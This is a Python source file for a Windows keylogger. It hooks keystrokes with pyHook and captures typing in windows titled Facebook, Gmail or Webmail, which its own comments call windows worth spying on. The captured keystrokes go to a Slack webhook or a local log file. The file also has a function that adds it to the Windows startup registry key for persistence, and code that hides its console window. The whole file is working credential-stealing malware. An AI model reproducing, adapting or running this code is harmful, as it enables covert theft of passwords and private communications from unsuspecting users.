import pythoncom
import pyHook
import os
import sys
import win32event, win32api, win32console, win32gui
import configparser
import time
import json
import threading
import Queue
from requests import Session, Request
from datetime import datetime
from _winreg import *
from os.path import join, abspath

#########################################
#		INITIALIZATION VARIABLES		#
#########################################

# Slack link:
config = configparser.ConfigParser()
config.read('slack.ini')
slack_channel = config['channel']['ch1']
slack_token = config['token']['tk1']
slack_url = config['webhook']['url']

# File info
FILE = 'logfile.log'
# Buffer info
BUFFER = Queue.Queue()
DATA = ''
DATA_LENGTH = 50

# Keywords for algorithm
key_words = ['FACEBOOK', 'GMAIL', 'WEBMAIL']

# Log configuration:
# MODE 0: log on local file
# MODE 1: log on slack server
MODE = 1

if MODE == 1:
	# start HTTP Session
	session = Session()

#################################
#		KEYLOGGER FUNCTIONS 	#
#################################

class EventHandler(threading.Thread):
	"""docstring for EventHandler."""
	def __init__(self, mode, buffer):
		super(EventHandler, self).__init__()
		self.mode = mode
		self.buffer = buffer

	def run(self):
		while True:
			if not self.buffer.empty():
				data, win_name = self.buffer.get()
				if self.is_relevant_window(win_name, key_words):
					self.log(data, win_name)

	def is_relevant_window(self, WindowName, key_words):
		'''check if the current visited window is worth to be spied by checking
		the key_words list'''
		res = False
		upper_case_wn = WindowName.upper()
		for key_word in key_words:
			if key_word in upper_case_wn:
				res = True
		return res

	def log(self, data, WindowName):
		log_info = {'datum': datetime.now().__str__(), 'WindowName': WindowName,
				'DATA': data}
		log = "{d[datum]} :: {d[WindowName]} :: {d[DATA]} \n".format(d=log_info)
		if self.mode == 0:
			self.log_on_file(FILE, log)
		elif self.mode == 1:
			self.log_on_cloud(slack_url, log)

	def log_on_file(self, file, DATA):
		'''append the input DATA in the log file'''
		with open(file, 'a') as f:
			f.write(DATA)

	def log_on_cloud(self, url, DATA):
		'''log the DATA collected in a Slack server'''
		payload = {'text': DATA}
		try:
			response = session.post(url=url, data=json.dumps(payload, ensure_ascii=False),
						headers={'Content-Type': 'application/json'}, verify=True)
			print(response.status_code)
		except Exception as e:
			print(e)

def on_keyboard(event):
	'''function that is executed every time the KeyDown event is detected'''
	global DATA
	with threading.RLock():
		if event.Ascii == 13: # return pressed
			key_pressed = '[RETURN]'
		elif event.Ascii == 9: # tab pressed
			key_pressed = '[TAB]'
		elif event.Ascii == 8:
			key_pressed = '[BACK]'
		else:
			# convert pressed key using Ascii look up table
			key_pressed = chr(event.Ascii)
		# add key stroke to buffer DATA
		DATA += key_pressed
		print(DATA)
		if len(DATA) >= DATA_LENGTH:
			# if buffer DATA is full, log the buffer
			BUFFER.put((DATA, event.WindowName))
			DATA = ''
	return True

def persist():
	'''Adds the executable file at startup Windows app'''
	directory = os.path.dirname(os.path.realpath(__file__))
	path_to_exe = directory + '\\' + sys.argv[0].split('\\')[-1]
	sub_key = 'Software\Microsoft\Windows\CurrentVersion\Run'
	with OpenKey(HKEY_CURRENT_USER, sub_key, 0, KEY_ALL_ACCESS) as key:
		SetValueEx(key, "Keylogger", 0, REG_SZ, path_to_exe)

#################################
#		ALGORITHM RELEVANT  	#
#################################


####################
#		MAIN	   #
####################

if __name__ == '__main__':
	eh = EventHandler(MODE, BUFFER)
	eh.start()
	print('eh started')
	# hide the console
	# window = win32console.GetConsoleWindow()
	# win32gui.ShowWindow(window, 0)
	# comment persist() if you don't want the code to run at startup of the computer
	# persist()
	hm = pyHook.HookManager()
	hm.SubscribeKeyDown(on_keyboard)
	hm.HookKeyboard()
	print('hooked')
	# infinite loop
	pythoncom.PumpMessages()
